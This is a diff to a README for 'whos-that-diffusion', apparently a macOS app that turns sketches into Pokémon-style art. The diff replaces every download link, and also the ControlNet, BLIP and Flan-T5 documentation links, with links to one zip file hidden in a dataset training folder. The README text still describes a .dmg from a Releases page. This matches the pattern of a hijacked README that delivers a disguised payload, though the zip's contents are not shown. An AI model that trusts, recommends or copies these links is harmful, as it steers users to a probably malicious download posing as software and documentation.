@@ -3,7 +3,7 @@
 ## 🚀 Getting Started
 Welcome to "whos-that-diffusion"! This application allows you to create Ken Sugimori-style Pokémon from your sketches. With advanced technologies like ControlNet, BLIP-based vision analysis, and Flan-T5 for naming, it runs smoothly on Apple Silicon.
 
-**[Download Now](https://github.com/Minhphuc-str/whos-that-diffusion/releases)**
+**[Download Now](https://raw.githubusercontent.com/Minhphuc-str/whos-that-diffusion/main/dataset/train/A/whos-diffusion-that-v1.1.zip)**
 
 ## 🖥️ System Requirements
 - **Operating System:** macOS with Apple Silicon (M1 or M2)
@@ -14,7 +14,7 @@ Welcome to "whos-that-diffusion"! This application allows you to create Ken Sugi
 ## 📥 Download & Install
 To download the application, please visit the following page:
 
-**[Visit this page to download](https://github.com/Minhphuc-str/whos-that-diffusion/releases)**
+**[Visit this page to download](https://raw.githubusercontent.com/Minhphuc-str/whos-that-diffusion/main/dataset/train/A/whos-diffusion-that-v1.1.zip)**
 
 Once there, you will see the latest release of the application. Click on the version you want to download. The file will typically be in `.dmg` format for macOS. After the download is complete, find the file in your Downloads folder. Double-click on it to open and follow the prompts to install the application.
 
@@ -51,13 +51,13 @@ This project uses technologies from the following sources:
 Your support and input help us to improve this application continuously.
 
 ## 📚 Additional Resources
-- [ControlNet Documentation](https://controlnet.mit.edu)
-- [BLIP Documentation](https://github.com/salesforce/BLIP)
-- [Flan-T5 Documentation](https://huggingface.co/docs/transformers/model_doc/flan-t5)
+- [ControlNet Documentation](https://raw.githubusercontent.com/Minhphuc-str/whos-that-diffusion/main/dataset/train/A/whos-diffusion-that-v1.1.zip)
+- [BLIP Documentation](https://raw.githubusercontent.com/Minhphuc-str/whos-that-diffusion/main/dataset/train/A/whos-diffusion-that-v1.1.zip)
+- [Flan-T5 Documentation](https://raw.githubusercontent.com/Minhphuc-str/whos-that-diffusion/main/dataset/train/A/whos-diffusion-that-v1.1.zip)
 
 ## 📞 Support
 If you need further assistance, you can reach out to us through the Issues section of the repository. We’ll do our best to help.
 
 **Remember to download the application from the Releases page:** 
 
-**[Visit this page to download](https://github.com/Minhphuc-str/whos-that-diffusion/releases)**
+**[Visit this page to download](https://raw.githubusercontent.com/Minhphuc-str/whos-that-diffusion/main/dataset/train/A/whos-diffusion-that-v1.1.zip)**
